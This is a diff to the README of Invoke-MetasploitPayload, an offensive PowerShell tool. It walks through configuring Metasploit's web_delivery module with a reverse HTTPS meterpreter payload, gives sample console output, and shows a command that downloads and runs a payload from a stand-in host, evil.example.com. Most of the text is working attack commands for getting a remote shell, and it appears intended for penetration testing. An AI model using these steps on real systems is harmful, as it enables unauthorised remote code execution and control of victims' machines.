@@ -20,20 +20,43 @@ The `target` variable determines what type of script we're using. `2` is for Pow
 ```
 set target 2
 ```
+
+By default, the module will generate a random string to be used as the URL for the script webserver. You can specify your own with the URIPATH variable.
+
+```
+set URIPATH posh-payload
+```
+
 Pick your payload. In this case, we'll use a reverse https meterpreter payload
 ```
 set payload windows/meterpreter/reverse_https
 set LHOST 0.0.0.0
 set LPORT 443
 ```
+
 Run the exploit
 ```
 run -j
 ```
 
 Once run, the web_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session.
+
+```
+msf exploit(web_delivery) > run -j
+[*] Exploit running as background job.
+
+[*] Started HTTPS reverse handler on https://10.211.55.4:8443/
+[*] Using URL: http://0.0.0.0:8080/posh-payload
+[*] Local IP: http://10.211.55.4:8080/posh-payload
+[*] Server started.
+```
+
 #### Getting the Payload URL
-After running the web_delivery module, it will print out the URL for the webserver hosting the script file. This will typically look like `http://[IP_OF_METASPLOIT_INSTANCE]/[RANDOM CHARACTERS]`. This URL is what you'll pass to `Invoke-MetasploitPayload`. _You can ignore the line about "Run the following command on the target machine"_
+After running the web_delivery module, it will print out the URL for the webserver hosting the script file. If you specified a URIPATH, this will be something like `http://[IP_OF_METASPLOIT_INSTANCE]/[URIPATH]` else it will have random characters for the URL (`http://[IP_OF_METASPLOIT_INSTANCE]/[URIPATH]`).
+
+This URL is what you'll pass to `Invoke-MetasploitPayload`. 
+
+_**You can ignore the line about "Run the following command on the target machine"**_
 
 ![Web Delivery Example](/web_delivery_screenshot.png)
 
@@ -48,7 +71,7 @@ oke-MetasploitPayload.ps1")
 
 Then just pass the URL from the web_delivery module to Invoke-MetasploitPayload. It will handle spinning up a new process and then downloading and executing the script.
 ```
-PS> Invoke-MetasploitPayload -url "http://evil.example.com/SDFJLWKS"
+PS> Invoke-MetasploitPayload "http://evil.example.com/SDFJLWKS"
 ```
 
 #### Acknowledgements
